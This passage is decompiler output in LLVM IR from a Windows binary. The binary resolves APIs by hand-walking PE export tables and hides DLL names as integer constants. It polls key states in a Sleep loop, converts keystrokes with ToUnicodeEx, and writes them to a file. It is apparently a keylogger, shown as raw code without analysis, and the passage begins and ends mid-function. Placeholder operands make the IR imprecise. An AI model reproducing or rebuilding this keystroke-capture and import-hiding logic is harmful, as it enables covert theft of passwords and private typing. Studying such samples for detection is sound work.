  %3 = ptrtoint i32* %stack_var_-4 to i32, !insn.addr !750
  %4 = load i32, i32* @global_var_1003d084, align 4, !insn.addr !751
  %5 = xor i32 %4, %3, !insn.addr !752
  store i32 1919251285, i32* @global_var_1003ff48, align 4, !insn.addr !753
  store i32 1680749107, i32* @global_var_1003ff4c, align 4, !insn.addr !754
  store i16 27756, i16* bitcast (i32* @global_var_1003ff50 to i16*), align 4, !insn.addr !755
  store i8 0, i8* bitcast (i32* @global_var_1003ff52 to i8*), align 4, !insn.addr !756
  %6 = call i128 @__asm_movaps(i128 146762043233123993736476900598140396871), !insn.addr !757
  %7 = load i128, i128* bitcast (i32* @global_var_1003ff48 to i128*), align 4, !insn.addr !758
  call void @__asm_movups(i128 %7, i128 %6), !insn.addr !758
  store i32 7827300, i32* @global_var_1003ff58, align 4, !insn.addr !759
  %8 = add i32 %5, 60, !insn.addr !760
  %9 = inttoptr i32 %8 to i32*, !insn.addr !760
  %10 = load i32, i32* %9, align 4, !insn.addr !760
  %11 = add i32 %5, 120, !insn.addr !761
  %12 = add i32 %11, %10, !insn.addr !761
  %13 = inttoptr i32 %12 to i32*, !insn.addr !761
  %14 = load i32, i32* %13, align 4, !insn.addr !761
  %15 = add i32 %14, %5, !insn.addr !762
  %16 = call i32 @function_10008e40(i32 %5, i32* nonnull @global_var_1003ff48), !insn.addr !763
  %17 = add i32 %15, 36, !insn.addr !764
  %18 = inttoptr i32 %17 to i32*, !insn.addr !764
  %19 = load i32, i32* %18, align 4, !insn.addr !764
  %20 = mul i32 %16, 2, !insn.addr !765
  %21 = add i32 %20, %5, !insn.addr !765
  %22 = add i32 %21, %19, !insn.addr !766
  %23 = inttoptr i32 %22 to i16*, !insn.addr !766
  %24 = load i16, i16* %23, align 2, !insn.addr !766
  %25 = zext i16 %24 to i32, !insn.addr !766
  %26 = add i32 %15, 28, !insn.addr !767
  %27 = inttoptr i32 %26 to i32*, !insn.addr !767
  %28 = load i32, i32* %27, align 4, !insn.addr !767
  %29 = mul i32 %25, 4, !insn.addr !768
  %30 = add i32 %28, %5, !insn.addr !768
  %31 = add i32 %30, %29, !insn.addr !769
  %32 = inttoptr i32 %31 to i32*, !insn.addr !769
  %33 = load i32, i32* %32, align 4, !insn.addr !769
  %34 = add i32 %33, %5, !insn.addr !770
  %35 = load i128, i128* @global_var_10038ed0, align 4, !insn.addr !771
  %36 = call i128 @__asm_movaps(i128 %35), !insn.addr !771
  %37 = load i128, i128* bitcast (i32* @global_var_1003ff48 to i128*), align 4, !insn.addr !772
  call void @__asm_movups(i128 %37, i128 %36), !insn.addr !772
  store i32 1701015410, i32* @global_var_1003ff58, align 4, !insn.addr !773
  store i32 1682535283, i32* @global_var_1003ff5c, align 4, !insn.addr !774
  store i8 0, i8* bitcast (i32* @global_var_1003ff60 to i8*), align 4, !insn.addr !775
  store i32 %34, i32* @global_var_1004003c, align 4, !insn.addr !776
  %38 = call i32 @function_10008e40(i32 %5, i32* nonnull @global_var_1003ff48), !insn.addr !777
  %39 = call i32 @_malloc(), !insn.addr !778
  %40 = load i128, i128* @global_var_10038f70, align 4, !insn.addr !779
  %41 = call i128 @__asm_movaps(i128 %40), !insn.addr !779
  store i8 0, i8* bitcast (i32* @global_var_1003ff58 to i8*), align 4, !insn.addr !780
  %42 = load i128, i128* bitcast (i32* @global_var_1003ff48 to i128*), align 4, !insn.addr !781
  call void @__asm_movups(i128 %42, i128 %41), !insn.addr !781
  %43 = call i32 @function_10007dc0(), !insn.addr !782
  %44 = call i128 @__asm_movaps(i128 156098482338468622207797376728339604807), !insn.addr !783
  store i16 116, i16* bitcast (i32* @global_var_1003ff58 to i16*), align 4, !insn.addr !784
  %45 = load i128, i128* bitcast (i32* @global_var_1003ff48 to i128*), align 4, !insn.addr !785
  call void @__asm_movups(i128 %45, i128 %44), !insn.addr !785
  %46 = call i32 @function_10007dc0(), !insn.addr !786
  %47 = call i128 @__asm_xorps(i128 %44, i128 %44), !insn.addr !787
  %sext = mul i32 %0, 65536
  %48 = sdiv i32 %sext, 65536, !insn.addr !788
  %49 = ptrtoint i16* %2 to i32
  %50 = zext i32 %49 to i128, !insn.addr !789
  call void @__asm_movups(i128 %50, i128 %47), !insn.addr !789
  call void @__asm_movups(i128 %1, i128 %47), !insn.addr !790
  %51 = call i32 @MapVirtualKeyExW(i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !791
  %52 = inttoptr i32 %51 to i16*, !insn.addr !792
  store i16* %52, i16** %stack_var_-156, align 4, !insn.addr !792
  %53 = bitcast i16** %stack_var_-40 to i16*
  %54 = inttoptr i32 %39 to i8*, !insn.addr !793
  %55 = inttoptr i32 %46 to i32*, !insn.addr !794
  %56 = call i32 @ToUnicodeEx(i32 %51, i32 %48, i8* %54, i16* nonnull %53, i32 16, i32 0, i32* %55), !insn.addr !794
  store i32 16, i32* %stack_var_-236, align 4, !insn.addr !795
  %57 = trunc i32 %56 to i16, !insn.addr !796
  %58 = icmp eq i16 %57, 0, !insn.addr !796
  store i32* %stack_var_-236, i32** %esp.0.in.reg2mem, !insn.addr !797
  br i1 %58, label %dec_label_pc_10002835, label %dec_label_pc_100027ca, !insn.addr !797

dec_label_pc_100027ca:                            ; preds = %dec_label_pc_10002600
  %59 = call i128 @__asm_movaps(i128 7368320664886723658192474275931), !insn.addr !798
  %60 = load i128, i128* %stack_var_-140, align 8, !insn.addr !799
  call void @__asm_movups(i128 %60, i128 %59), !insn.addr !799
  %61 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !800
  %62 = ptrtoint i32* %61 to i32, !insn.addr !800
  %63 = ptrtoint i128* %stack_var_-140 to i32, !insn.addr !801
  store i32 %62, i32* @global_var_1003d9c0, align 4, !insn.addr !802
  store i32 %63, i32* %ecx.0.reg2mem, !insn.addr !803
  br label %dec_label_pc_10002805, !insn.addr !803

dec_label_pc_10002805:                            ; preds = %dec_label_pc_10002805, %dec_label_pc_100027ca
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %64 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !804
  %65 = load i16, i16* %64, align 2, !insn.addr !804
  %66 = add i32 %ecx.0.reload, 2, !insn.addr !805
  %67 = icmp eq i16 %65, 0, !insn.addr !806
  %68 = icmp eq i1 %67, false, !insn.addr !807
  store i32 %66, i32* %ecx.0.reg2mem, !insn.addr !807
  br i1 %68, label %dec_label_pc_10002805, label %dec_label_pc_10002810, !insn.addr !807

dec_label_pc_10002810:                            ; preds = %dec_label_pc_10002805
  %69 = ptrtoint i32* %stack_var_-138 to i32, !insn.addr !808
  %70 = sub i32 %66, %69, !insn.addr !809
  %71 = bitcast i128* %stack_var_-140 to i32*, !insn.addr !810
  %72 = call i1 @WriteFile(i32* %61, i32* nonnull %71, i32 %70, i32* nonnull @global_var_10040038, %_OVERLAPPED* null), !insn.addr !810
  %73 = load i32, i32* @global_var_1003d9c0, align 4, !insn.addr !811
  store i32 %73, i32* %stack_var_-288, align 4, !insn.addr !811
  %74 = inttoptr i32 %73 to i32*, !insn.addr !812
  %75 = call i1 @CloseHandle(i32* %74), !insn.addr !812
  store i32* %stack_var_-288, i32** %esp.0.in.reg2mem, !insn.addr !812
  br label %dec_label_pc_10002835, !insn.addr !812

dec_label_pc_10002835:                            ; preds = %dec_label_pc_10002810, %dec_label_pc_10002600
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %76 = icmp eq i32 %56, 0, !insn.addr !813
  %77 = add i32 %esp.0, -4, !insn.addr !814
  %78 = inttoptr i32 %77 to i32*, !insn.addr !814
  store i32 0, i32* %78, align 4, !insn.addr !814
  %79 = add i32 %esp.0, -8, !insn.addr !815
  %80 = inttoptr i32 %79 to i32*, !insn.addr !815
  store i32 128, i32* %80, align 4, !insn.addr !815
  %81 = add i32 %esp.0, -12, !insn.addr !816
  %82 = inttoptr i32 %81 to i32*, !insn.addr !816
  store i32 4, i32* %82, align 4, !insn.addr !816
  %83 = add i32 %esp.0, -16, !insn.addr !817
  %84 = inttoptr i32 %83 to i32*, !insn.addr !817
  store i32 0, i32* %84, align 4, !insn.addr !817
  %85 = add i32 %esp.0, -20, !insn.addr !818
  %86 = inttoptr i32 %85 to i32*, !insn.addr !818
  store i32 1, i32* %86, align 4, !insn.addr !818
  %87 = add i32 %esp.0, -24, !insn.addr !819
  %88 = inttoptr i32 %87 to i32*, !insn.addr !819
  store i32 4, i32* %88, align 4, !insn.addr !819
  %89 = add i32 %esp.0, -28, !insn.addr !820
  %90 = inttoptr i32 %89 to i32*, !insn.addr !820
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %90, align 4, !insn.addr !820
  br i1 %76, label %dec_label_pc_1000287d, label %dec_label_pc_10002852, !insn.addr !821

dec_label_pc_10002852:                            ; preds = %dec_label_pc_10002835
  %91 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !822
  %92 = ptrtoint i32* %91 to i32, !insn.addr !822
  %93 = ptrtoint i16** %stack_var_-40 to i32
  store i32 %92, i32* @global_var_1003d9c0, align 4, !insn.addr !823
  store i32 %93, i32* %ecx.1.reg2mem, !insn.addr !824
  br label %dec_label_pc_10002862, !insn.addr !824

dec_label_pc_10002862:                            ; preds = %dec_label_pc_10002862, %dec_label_pc_10002852
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %94 = inttoptr i32 %ecx.1.reload to i16*, !insn.addr !825
  %95 = load i16, i16* %94, align 2, !insn.addr !825
  %96 = add i32 %ecx.1.reload, 2, !insn.addr !826
  %97 = icmp eq i16 %95, 0, !insn.addr !827
  %98 = icmp eq i1 %97, false, !insn.addr !828
  store i32 %96, i32* %ecx.1.reg2mem, !insn.addr !828
  br i1 %98, label %dec_label_pc_10002862, label %dec_label_pc_1000286d, !insn.addr !828

dec_label_pc_1000286d:                            ; preds = %dec_label_pc_10002862
  %99 = ptrtoint i32* %stack_var_-38 to i32, !insn.addr !824
  %100 = sub i32 %96, %99, !insn.addr !829
  %101 = add i32 %esp.0, -32, !insn.addr !830
  %102 = inttoptr i32 %101 to i32*, !insn.addr !830
  store i32 0, i32* %102, align 4, !insn.addr !830
  %103 = add i32 %esp.0, -36, !insn.addr !831
  %104 = inttoptr i32 %103 to i32*, !insn.addr !831
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %104, align 4, !insn.addr !831
  %105 = add i32 %esp.0, -40, !insn.addr !832
  %106 = inttoptr i32 %105 to i32*, !insn.addr !832
  store i32 %100, i32* %106, align 4, !insn.addr !832
  store i32 %93, i32* %.pre-phi.reg2mem, !insn.addr !833
  store i32 %92, i32* %edx.0.reg2mem, !insn.addr !833
  store i32 %105, i32* %storemerge.reg2mem, !insn.addr !833
  br label %dec_label_pc_100028b0, !insn.addr !833

dec_label_pc_1000287d:                            ; preds = %dec_label_pc_10002835
  %107 = load i16*, i16** %stack_var_-156, align 4
  %108 = ptrtoint i16* %107 to i32
  %109 = bitcast i16** %stack_var_-40 to i32*
  store i32 %108, i32* %109, align 4
  %110 = call i32* @CreateFileW(i16* %107, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !834
  %111 = ptrtoint i32* %110 to i32, !insn.addr !834
  %112 = ptrtoint i16** %stack_var_-40 to i32
  store i32 %111, i32* @global_var_1003d9c0, align 4, !insn.addr !835
  store i32 %112, i32* %ecx.2.reg2mem, !insn.addr !836
  br label %dec_label_pc_10002896, !insn.addr !836

dec_label_pc_10002896:                            ; preds = %dec_label_pc_10002896, %dec_label_pc_1000287d
  %ecx.2.reload = load i32, i32* %ecx.2.reg2mem
  %113 = inttoptr i32 %ecx.2.reload to i16*, !insn.addr !837
  %114 = load i16, i16* %113, align 2, !insn.addr !837
  %115 = add i32 %ecx.2.reload, 2, !insn.addr !838
  %116 = icmp eq i16 %114, 0, !insn.addr !839
  %117 = icmp eq i1 %116, false, !insn.addr !840
  store i32 %115, i32* %ecx.2.reg2mem, !insn.addr !840
  br i1 %117, label %dec_label_pc_10002896, label %dec_label_pc_100028a1, !insn.addr !840

dec_label_pc_100028a1:                            ; preds = %dec_label_pc_10002896
  %118 = ptrtoint i32* %stack_var_-38 to i32, !insn.addr !836
  %119 = sub i32 %115, %118, !insn.addr !841
  %120 = add i32 %esp.0, -32, !insn.addr !842
  %121 = inttoptr i32 %120 to i32*, !insn.addr !842
  store i32 0, i32* %121, align 4, !insn.addr !842
  %122 = add i32 %esp.0, -36, !insn.addr !843
  %123 = inttoptr i32 %122 to i32*, !insn.addr !843
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %123, align 4, !insn.addr !843
  %124 = add i32 %esp.0, -40, !insn.addr !844
  %125 = inttoptr i32 %124 to i32*, !insn.addr !844
  store i32 %119, i32* %125, align 4, !insn.addr !844
  store i32 %112, i32* %.pre-phi.reg2mem, !insn.addr !844
  store i32 %111, i32* %edx.0.reg2mem, !insn.addr !844
  store i32 %124, i32* %storemerge.reg2mem, !insn.addr !844
  br label %dec_label_pc_100028b0, !insn.addr !844

dec_label_pc_100028b0:                            ; preds = %dec_label_pc_100028a1, %dec_label_pc_1000286d
  %storemerge.reload = load i32, i32* %storemerge.reg2mem
  %edx.0.reload = load i32, i32* %edx.0.reg2mem
  %.pre-phi.reload = load i32, i32* %.pre-phi.reg2mem
  %126 = add i32 %storemerge.reload, -4, !insn.addr !845
  %127 = inttoptr i32 %126 to i32*, !insn.addr !845
  store i32 %.pre-phi.reload, i32* %127, align 4, !insn.addr !845
  %128 = add i32 %storemerge.reload, -8, !insn.addr !846
  %129 = inttoptr i32 %128 to i32*, !insn.addr !846
  store i32 %edx.0.reload, i32* %129, align 4, !insn.addr !846
  %130 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !847
  %131 = load i32, i32* @global_var_1003d9c0, align 4, !insn.addr !848
  %132 = add i32 %storemerge.reload, -12, !insn.addr !848
  %133 = inttoptr i32 %132 to i32*, !insn.addr !848
  store i32 %131, i32* %133, align 4, !insn.addr !848
  %134 = call i1 @CloseHandle(i32* nonnull @4), !insn.addr !849
  %135 = add i32 %storemerge.reload, -16, !insn.addr !850
  %136 = inttoptr i32 %135 to i32*, !insn.addr !850
  store i32 %39, i32* %136, align 4, !insn.addr !850
  %137 = call i32 @_free(), !insn.addr !851
  %138 = call i32 @"@__security_check_cookie@4"(), !insn.addr !852
  ret i32 %138, !insn.addr !853
}

define i32 @function_100028e0() local_unnamed_addr {
dec_label_pc_100028e0:
  %esp.0.be.reg2mem = alloca i32, !insn.addr !854
  %esp.6.reg2mem = alloca i32, !insn.addr !854
  %.pre-phi.reg2mem = alloca i32, !insn.addr !854
  %esp.5.reg2mem = alloca i32, !insn.addr !854
  %esp.4.reg2mem = alloca i32, !insn.addr !854
  %edx.6.reg2mem = alloca i32, !insn.addr !854
  %.pn.reg2mem = alloca i32, !insn.addr !854
  %ecx.16.reg2mem = alloca i32, !insn.addr !854
  %ecx.15.reg2mem = alloca i32, !insn.addr !854
  %ecx.14.reg2mem = alloca i32, !insn.addr !854
  %ecx.13.reg2mem = alloca i32, !insn.addr !854
  %ecx.12.reg2mem = alloca i32, !insn.addr !854
  %ecx.11.reg2mem = alloca i32, !insn.addr !854
  %ecx.10.reg2mem = alloca i32, !insn.addr !854
  %ecx.9.reg2mem = alloca i32, !insn.addr !854
  %ecx.8.reg2mem = alloca i32, !insn.addr !854
  %ecx.7.reg2mem = alloca i32, !insn.addr !854
  %ecx.6.reg2mem = alloca i32, !insn.addr !854
  %ecx.5.reg2mem = alloca i32, !insn.addr !854
  %ecx.4.reg2mem = alloca i32, !insn.addr !854
  %esp.3.reg2mem = alloca i32, !insn.addr !854
  %ecx.3.reg2mem = alloca i32, !insn.addr !854
  %eax.2.reg2mem = alloca i32, !insn.addr !854
  %esp.2.reg2mem = alloca i32, !insn.addr !854
  %ecx.0.reg2mem = alloca i32, !insn.addr !854
  %eax.1.reg2mem = alloca i32, !insn.addr !854
  %esp.1.reg2mem = alloca i32, !insn.addr !854
  %eax.0.reg2mem = alloca i32, !insn.addr !854
  %stack_var_-216.0.reg2mem = alloca i16*, !insn.addr !854
  %esp.0.reg2mem = alloca i32, !insn.addr !854
  %stack_var_-106 = alloca i32, align 4
  %stack_var_-108 = alloca i128, align 8
  %0 = call i32 @__decompiler_undefined_function_1()
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-208 = alloca i128, align 8
  store i128 1919251285, i128* %stack_var_-208, align 8, !insn.addr !855
  %1 = ptrtoint i128* %stack_var_-208 to i32, !insn.addr !856
  store i32 %1, i32* %stack_var_-240, align 4, !insn.addr !856
  %2 = load i128, i128* @global_var_10038f80, align 4, !insn.addr !857
  %3 = call i128 @__asm_movaps(i128 %2), !insn.addr !857
  call void @__asm_movups(i128 undef, i128 %3), !insn.addr !858
  %4 = add i32 %0, 120, !insn.addr !859
  %5 = add i32 %4, %1, !insn.addr !859
  %6 = inttoptr i32 %5 to i32*, !insn.addr !859
  %7 = load i32, i32* %6, align 4, !insn.addr !859
  %8 = add i32 %7, %1, !insn.addr !860
  %9 = bitcast i128* %stack_var_-208 to i32*, !insn.addr !861
  %10 = call i32 @function_10008e40(i32 %1, i32* nonnull %9), !insn.addr !861
  %11 = add i32 %8, 36, !insn.addr !862
  %12 = inttoptr i32 %11 to i32*, !insn.addr !862
  %13 = load i32, i32* %12, align 4, !insn.addr !862
  %14 = call i128 @__asm_movaps(i128 146762043233123993736476900598140396871), !insn.addr !863
  %15 = mul i32 %10, 2, !insn.addr !864
  %16 = add i32 %15, %1, !insn.addr !864
  %17 = add i32 %16, %13, !insn.addr !865
  %18 = inttoptr i32 %17 to i16*, !insn.addr !865
  %19 = load i16, i16* %18, align 2, !insn.addr !865
  %20 = zext i16 %19 to i32, !insn.addr !865
  %21 = add i32 %8, 28, !insn.addr !866
  %22 = inttoptr i32 %21 to i32*, !insn.addr !866
  %23 = load i32, i32* %22, align 4, !insn.addr !866
  %24 = mul i32 %20, 4, !insn.addr !867
  %25 = add i32 %23, %1, !insn.addr !867
  %26 = add i32 %25, %24, !insn.addr !868
  %27 = inttoptr i32 %26 to i32*, !insn.addr !868
  %28 = load i32, i32* %27, align 4, !insn.addr !868
  %29 = add i32 %28, %1, !insn.addr !869
  call void @__asm_movups(i128 undef, i128 %14), !insn.addr !870
  store i32 %29, i32* @global_var_10040044, align 4, !insn.addr !871
  %30 = call i32 @function_10008e40(i32 %1, i32* nonnull %9), !insn.addr !872
  %31 = ptrtoint i32* %stack_var_-240 to i32, !insn.addr !873
  store i128 1467245895, i128* %stack_var_-208, align 8, !insn.addr !874
  %32 = call i32 @function_10007dc0(), !insn.addr !875
  %33 = ptrtoint i128* %stack_var_-108 to i32
  %34 = ptrtoint i32* %stack_var_-106 to i32
  %35 = load i128, i128* @global_var_10038d50, align 4
  %36 = load i128, i128* @global_var_10038d70, align 4
  %37 = load i128, i128* @global_var_10038d60, align 4
  %38 = load i128, i128* @global_var_10038d40, align 4
  store i32 %31, i32* %esp.0.reg2mem, !insn.addr !876
  br label %dec_label_pc_10002a20, !insn.addr !876

dec_label_pc_10002a20:                            ; preds = %dec_label_pc_10002a20.backedge, %dec_label_pc_100028e0
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %39 = add i32 %esp.0.reload, -4, !insn.addr !877
  %40 = inttoptr i32 %39 to i32*, !insn.addr !877
  store i32 30, i32* %40, align 4, !insn.addr !877
  call void @Sleep(i32 %32), !insn.addr !878
  store i16* inttoptr (i32 8 to i16*), i16** %stack_var_-216.0.reg2mem, !insn.addr !879
  store i32 8, i32* %eax.0.reg2mem, !insn.addr !879
  store i32 %39, i32* %esp.1.reg2mem, !insn.addr !879
  br label %dec_label_pc_10002a33, !insn.addr !879

dec_label_pc_10002a33:                            ; preds = %dec_label_pc_1000342f, %dec_label_pc_10002a20
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %stack_var_-216.0.reload = load i16*, i16** %stack_var_-216.0.reg2mem
  %sext = mul i32 %eax.0.reload, 65536
  %41 = sdiv i32 %sext, 65536, !insn.addr !880
  %42 = add i32 %esp.1.reload, -4, !insn.addr !881
  %43 = inttoptr i32 %42 to i32*, !insn.addr !881
  store i32 %41, i32* %43, align 4, !insn.addr !881
  %44 = trunc i32 %41 to i16, !insn.addr !882
  %45 = icmp eq i16 %44, -32767, !insn.addr !882
  %46 = icmp eq i1 %45, false, !insn.addr !883
  br i1 %46, label %dec_label_pc_10002a33.dec_label_pc_1000342f_crit_edge, label %dec_label_pc_10002a49, !insn.addr !883

dec_label_pc_10002a33.dec_label_pc_1000342f_crit_edge: ; preds = %dec_label_pc_10002a33
  %.pre = ptrtoint i16* %stack_var_-216.0.reload to i32, !insn.addr !884
  store i32 %.pre, i32* %.pre-phi.reg2mem
  store i32 %42, i32* %esp.6.reg2mem
  br label %dec_label_pc_1000342f

dec_label_pc_10002a49:                            ; preds = %dec_label_pc_10002a33
  store i32 %41, i32* @global_var_1004003c, align 4, !insn.addr !885
  %47 = icmp eq i32 %sext, 0, !insn.addr !886
  store i32 %42, i32* %esp.3.reg2mem, !insn.addr !887
  br i1 %47, label %dec_label_pc_10002bae, label %dec_label_pc_10002a5c, !insn.addr !887

dec_label_pc_10002a5c:                            ; preds = %dec_label_pc_10002a49
  %48 = add i32 %esp.1.reload, -8, !insn.addr !888
  %49 = inttoptr i32 %48 to i32*, !insn.addr !888
  store i32 1024, i32* %49, align 4, !insn.addr !888
  %50 = add i32 %esp.1.reload, -12, !insn.addr !889
  %51 = inttoptr i32 %50 to i32*, !insn.addr !889
  store i32 ptrtoint (i16** @global_var_1003f530 to i32), i32* %51, align 4, !insn.addr !889
  %52 = add i32 %esp.1.reload, -16, !insn.addr !890
  %53 = inttoptr i32 %52 to i32*, !insn.addr !890
  store i32 %41, i32* %53, align 4, !insn.addr !890
  store i32 ptrtoint (i16** @global_var_1003f530 to i32), i32* %eax.1.reg2mem, !insn.addr !891
  store i32 ptrtoint (i16** @global_var_10040048 to i32), i32* %ecx.0.reg2mem, !insn.addr !891
  br label %dec_label_pc_10002a80, !insn.addr !891

dec_label_pc_10002a80:                            ; preds = %dec_label_pc_10002a97, %dec_label_pc_10002a5c
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  %54 = inttoptr i32 %eax.1.reload to i16*, !insn.addr !892
  %55 = load i16, i16* %54, align 4, !insn.addr !892
  %56 = inttoptr i32 %ecx.0.reload to i16*, !insn.addr !893
  %57 = load i16, i16* %56, align 4, !insn.addr !893
  %58 = icmp eq i16 %55, %57, !insn.addr !893
  %59 = icmp eq i1 %58, false, !insn.addr !894
  br i1 %59, label %dec_label_pc_10002ab3, label %dec_label_pc_10002a88, !insn.addr !894

dec_label_pc_10002a88:                            ; preds = %dec_label_pc_10002a80
  %60 = icmp eq i16 %55, 0, !insn.addr !895
  store i32 %52, i32* %esp.3.reg2mem, !insn.addr !896
  br i1 %60, label %dec_label_pc_10002bae, label %dec_label_pc_10002a8d, !insn.addr !896

dec_label_pc_10002a8d:                            ; preds = %dec_label_pc_10002a88
  %61 = or i32 %eax.1.reload, 2, !insn.addr !897
  %62 = inttoptr i32 %61 to i16*, !insn.addr !897
  %63 = load i16, i16* %62, align 2, !insn.addr !897
  %64 = or i32 %ecx.0.reload, 2, !insn.addr !898
  %65 = inttoptr i32 %64 to i16*, !insn.addr !898
  %66 = load i16, i16* %65, align 2, !insn.addr !898
  %67 = icmp eq i16 %63, %66, !insn.addr !898
  %68 = icmp eq i1 %67, false, !insn.addr !899
  br i1 %68, label %dec_label_pc_10002ab3, label %dec_label_pc_10002a97, !insn.addr !899

dec_label_pc_10002a97:                            ; preds = %dec_label_pc_10002a8d
  %69 = add i32 %eax.1.reload, 4, !insn.addr !900
  %70 = add i32 %ecx.0.reload, 4, !insn.addr !901
  %71 = icmp eq i16 %63, 0, !insn.addr !902
  %72 = icmp eq i1 %71, false, !insn.addr !903
  store i32 %69, i32* %eax.1.reg2mem, !insn.addr !903
  store i32 %70, i32* %ecx.0.reg2mem, !insn.addr !903
  store i32 %52, i32* %esp.3.reg2mem, !insn.addr !903
  br i1 %72, label %dec_label_pc_10002a80, label %dec_label_pc_10002bae, !insn.addr !903

dec_label_pc_10002ab3:                            ; preds = %dec_label_pc_10002a8d, %dec_label_pc_10002a80
  %73 = load i32, i32* @global_var_1003f528, align 4, !insn.addr !904
  %74 = icmp eq i32 %73, 0, !insn.addr !904
  %75 = add i32 %esp.1.reload, -20, !insn.addr !905
  %76 = inttoptr i32 %75 to i32*, !insn.addr !905
  store i32 0, i32* %76, align 4, !insn.addr !905
  %77 = add i32 %esp.1.reload, -24, !insn.addr !906
  %78 = inttoptr i32 %77 to i32*, !insn.addr !906
  store i32 128, i32* %78, align 4, !insn.addr !906
  %79 = add i32 %esp.1.reload, -28
  %80 = inttoptr i32 %79 to i32*
  br i1 %74, label %dec_label_pc_10002af4, label %dec_label_pc_10002ac3, !insn.addr !907

dec_label_pc_10002ac3:                            ; preds = %dec_label_pc_10002ab3
  store i32 2, i32* %80, align 4, !insn.addr !908
  %81 = add i32 %esp.1.reload, -32, !insn.addr !909
  %82 = inttoptr i32 %81 to i32*, !insn.addr !909
  store i32 0, i32* %82, align 4, !insn.addr !909
  %83 = add i32 %esp.1.reload, -36, !insn.addr !910
  %84 = inttoptr i32 %83 to i32*, !insn.addr !910
  store i32 2, i32* %84, align 4, !insn.addr !910
  %85 = add i32 %esp.1.reload, -40, !insn.addr !911
  %86 = inttoptr i32 %85 to i32*, !insn.addr !911
  store i32 2, i32* %86, align 4, !insn.addr !911
  %87 = add i32 %esp.1.reload, -44, !insn.addr !912
  %88 = inttoptr i32 %87 to i32*, !insn.addr !912
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %88, align 4, !insn.addr !912
  %89 = call i32* @CreateFileW(i16* bitcast (i32* @4 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !913
  %90 = ptrtoint i32* %89 to i32, !insn.addr !913
  %91 = add i32 %esp.1.reload, -48, !insn.addr !914
  %92 = inttoptr i32 %91 to i32*, !insn.addr !914
  store i32 0, i32* %92, align 4, !insn.addr !914
  %93 = add i32 %esp.1.reload, -52, !insn.addr !915
  %94 = inttoptr i32 %93 to i32*, !insn.addr !915
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %94, align 4, !insn.addr !915
  %95 = add i32 %esp.1.reload, -56, !insn.addr !916
  %96 = inttoptr i32 %95 to i32*, !insn.addr !916
  store i32 2, i32* %96, align 4, !insn.addr !916
  %97 = add i32 %esp.1.reload, -60, !insn.addr !917
  %98 = inttoptr i32 %97 to i32*, !insn.addr !917
  store i32 ptrtoint (i32* @global_var_1003d9c4 to i32), i32* %98, align 4, !insn.addr !917
  %99 = add i32 %esp.1.reload, -64, !insn.addr !918
  %100 = inttoptr i32 %99 to i32*, !insn.addr !918
  store i32 %90, i32* %100, align 4, !insn.addr !918
  store i32 %90, i32* @global_var_1003d9c0, align 4, !insn.addr !919
  %101 = call i1 @WriteFile(i32* nonnull @4, i32* nonnull @4, i32 ptrtoint (i32* @4 to i32), i32* nonnull @4, %_OVERLAPPED* bitcast (i32* @4 to %_OVERLAPPED*)), !insn.addr !920
  store i32 0, i32* @global_var_1003f528, align 4, !insn.addr !921
  store i32 %99, i32* %esp.2.reg2mem, !insn.addr !922
  br label %dec_label_pc_10002b08, !insn.addr !922

dec_label_pc_10002af4:                            ; preds = %dec_label_pc_10002ab3
  store i32 4, i32* %80, align 4, !insn.addr !923
  %102 = add i32 %esp.1.reload, -32, !insn.addr !924
  %103 = inttoptr i32 %102 to i32*, !insn.addr !924
  store i32 0, i32* %103, align 4, !insn.addr !924
  %104 = add i32 %esp.1.reload, -36, !insn.addr !925
  %105 = inttoptr i32 %104 to i32*, !insn.addr !925
  store i32 1, i32* %105, align 4, !insn.addr !925
  %106 = add i32 %esp.1.reload, -40, !insn.addr !926
  %107 = inttoptr i32 %106 to i32*, !insn.addr !926
  store i32 4, i32* %107, align 4, !insn.addr !926
  %108 = add i32 %esp.1.reload, -44, !insn.addr !927
  %109 = inttoptr i32 %108 to i32*, !insn.addr !927
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %109, align 4, !insn.addr !927
